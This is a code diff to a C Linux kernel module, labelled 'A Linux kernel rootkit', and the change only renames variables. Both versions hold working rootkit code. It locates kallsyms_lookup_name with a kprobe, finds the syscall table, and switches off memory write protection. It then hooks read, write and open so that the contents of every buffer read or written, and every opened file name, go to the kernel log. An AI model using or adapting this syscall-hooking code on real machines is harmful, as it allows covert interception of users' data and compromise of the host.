@@ -14,27 +14,27 @@ MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
 MODULE_DESCRIPTION("A Linux kernel rootkit");
 MODULE_VERSION("0.1");
 
-static unsigned long orig_cr0;
+static unsigned long ul_orig_cr0;
 static kallsyms_t lookup_name;
-static uint64_t *syscall_table;
+static uint64_t *p_syscall_table;
 static sysfun_t orig_read;
 static sysfun_t orig_write;
 static sysfun_t orig_open;
 
 static int __init rootkit_init(void)
 {
-	int err;
+	int i_err;
 
 	// Declare what we need to find
 	struct kprobe probe = {
 		.symbol_name = "kallsyms_lookup_name",
 	};
 
-	err = register_kprobe(&probe);
-	if (err) {
+	i_err = register_kprobe(&probe);
+	if (i_err) {
 		pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.");
 
-		return err;
+		return i_err;
 	}
 
 	// Function pointer type of kallsyms_lookup_name()
@@ -44,98 +44,98 @@ static int __init rootkit_init(void)
 	unregister_kprobe(&probe);
 
 	// Find syscall table address
-	syscall_table = lookup_name("sys_call_table");
+	p_syscall_table = lookup_name("sys_call_table");
 
-	orig_cr0 = unprotect_memory();
+	ul_orig_cr0 = unprotect_memory();
 
-	orig_read = (sysfun_t)syscall_table[__NR_read];
-	syscall_table[__NR_read] = (uint64_t)new_read;
-	orig_write = (sysfun_t)syscall_table[__NR_write];
-	syscall_table[__NR_write] = (uint64_t)new_write;
-	orig_open = (sysfun_t)syscall_table[__NR_open];
-	syscall_table[__NR_open] = (uint64_t)new_open;
+	orig_read = (sysfun_t)p_syscall_table[__NR_read];
+	p_syscall_table[__NR_read] = (uint64_t)new_read;
+	orig_write = (sysfun_t)p_syscall_table[__NR_write];
+	p_syscall_table[__NR_write] = (uint64_t)new_write;
+	orig_open = (sysfun_t)p_syscall_table[__NR_open];
+	p_syscall_table[__NR_open] = (uint64_t)new_open;
 
-	protect_memory(orig_cr0);
+	protect_memory(ul_orig_cr0);
 
 	pr_info("[ROOTKIT] Module loaded");
 	pr_info("[ROOTKIT] kallsym_lookup_name() address: %p", lookup_name);
-	pr_info("[ROOTKIT] Syscall table address: %p", syscall_table);
+	pr_info("[ROOTKIT] Syscall table address: %p", p_syscall_table);
 	return 0;
 }
 
 static __exit void rootkit_exit(void)
 {
 	// Restore original syscall functions
-	orig_cr0 = unprotect_memory();
+	ul_orig_cr0 = unprotect_memory();
 
-	syscall_table[__NR_read] = (uint64_t)orig_read;
-	syscall_table[__NR_write] = (uint64_t)orig_write;
-	syscall_table[__NR_open] = (uint64_t)orig_open;
+	p_syscall_table[__NR_read] = (uint64_t)orig_read;
+	p_syscall_table[__NR_write] = (uint64_t)orig_write;
+	p_syscall_table[__NR_open] = (uint64_t)orig_open;
 
-	protect_memory(orig_cr0);
+	protect_memory(ul_orig_cr0);
 
 	pr_info("[ROOTKIT] Module unloaded");
 	return;
 }
 
-long new_read(struct pt_regs *regs)
+long new_read(struct pt_regs *p_regs)
 {
-	unsigned int fd = (unsigned int)regs->di; // first parameter
-	char __user *buf = (char __user *)regs->si; // second parameter
-	size_t count = (size_t)regs->dx; // third parameter
+	unsigned int ui_fd = (unsigned int)p_regs->di; // first parameter
+	char __user *s_buf = (char __user *)p_regs->si; // second parameter
+	size_t sz_count = (size_t)p_regs->dx; // third parameter
 
-	long ret;
-	char *data;
+	long l_ret;
+	char *s_data;
 
-	pr_info("[ROOTKIT] read(%u, %p, %zd)", fd, buf, count);
+	pr_info("[ROOTKIT] read(%u, %p, %zd)", ui_fd, s_buf, sz_count);
 
-	ret = orig_read(regs);
+	l_ret = orig_read(p_regs);
 
-	data = (char *)kvmalloc(count + 1, GFP_KERNEL);
+	s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
-	if (copy_from_user(data, buf, count)) {
-		pr_err("[ROOTKIT] * Could not copy data from user");
+	if (copy_from_user(s_data, s_buf, sz_count)) {
+		pr_err("[ROOTKIT] * Could not copy s_data from user");
 	} else {
-		data[count] = '\0';
-		pr_info("[ROOTKIT] * Data read: %s", data);
-		kvfree(data);
+		s_data[sz_count] = '\0';
+		pr_info("[ROOTKIT] * Data read: %s", s_data);
+		kvfree(s_data);
 	}
 
-	return ret;
+	return l_ret;
 }
 
-long new_write(struct pt_regs *regs)
+long new_write(struct pt_regs *p_regs)
 {
-	unsigned int fd = (unsigned int)regs->di;
-	const char __user *buf = (const char __user *)regs->si;
-	size_t count = (size_t)regs->dx;
+	unsigned int ui_fd = (unsigned int)p_regs->di;
+	const char __user *s_buf = (const char __user *)p_regs->si;
+	size_t sz_count = (size_t)p_regs->dx;
 
-	char *data;
+	char *s_data;
 
-	pr_info("[ROOTKIT] write(%u, %p, %zd)", fd, buf, count);
+	pr_info("[ROOTKIT] write(%u, %p, %zd)", ui_fd, s_buf, sz_count);
 
-	data = (char *)kvmalloc(count + 1, GFP_KERNEL);
+	s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
-	if (copy_from_user(data, buf, count)) {
-		pr_err("[ROOTKIT] * Could not copy data from user");
+	if (copy_from_user(s_data, s_buf, sz_count)) {
+		pr_err("[ROOTKIT] * Could not copy s_data from user");
 	} else {
-		data[count] = '\0';
-		pr_info("[ROOTKIT] * Data to write: %s", data);
-		kvfree(data);
+		s_data[sz_count] = '\0';
+		pr_info("[ROOTKIT] * Data to write: %s", s_data);
+		kvfree(s_data);
 	}
 
-	return orig_write(regs);
+	return orig_write(p_regs);
 }
 
-long new_open(struct pt_regs *regs)
+long new_open(struct pt_regs *p_regs)
 {
-	const char __user *filename = (const char *)regs->di;
-	int flags = (int)regs->si;
-	umode_t mode = (umode_t)regs->dx;
+	const char __user *filename = (const char *)p_regs->di;
+	int flags = (int)p_regs->si;
+	umode_t mode = (umode_t)p_regs->dx;
 
 	pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)", filename, flags, mode);
 
-	return orig_open(regs);
+	return orig_open(p_regs);
 }
 
 module_init(rootkit_init);
